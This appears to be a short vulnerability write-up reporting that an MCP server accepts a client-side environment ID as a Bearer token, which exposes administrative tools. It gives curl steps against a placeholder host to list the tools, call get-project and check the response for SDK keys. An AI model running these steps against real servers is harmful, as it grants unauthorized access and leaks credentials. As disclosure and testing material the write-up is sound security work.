## Use case

The target's MCP server allowed authentication using a client-side environment ID, which was documented as safe to expose, leading to unauthorized access to administrative tools. This misconfiguration allowed for credential escalation and potential irreversible actions.

## Steps to test

1. Extract the client-side environment ID from the web application using browser DevTools.
2. Use the extracted environment ID as a Bearer token to authenticate against the MCP server endpoint: curl -s -X POST https://mcp.example.com/mcp/targetname -H 'Authorization: Bearer <CLIENT_SIDE_ENV_ID>' -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":1}'
3. Verify the response returns HTTP 200 and a list of administrative tools.
4. Call the get-project method using the same Bearer token: curl -s -X POST https://mcp.example.com/mcp/targetname -H 'Authorization: Bearer <CLIENT_SIDE_ENV_ID>' -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get-project","arguments":{"projectKey":"default"}},"id":1}'
5. Check the response for sensitive information such as SDK keys.
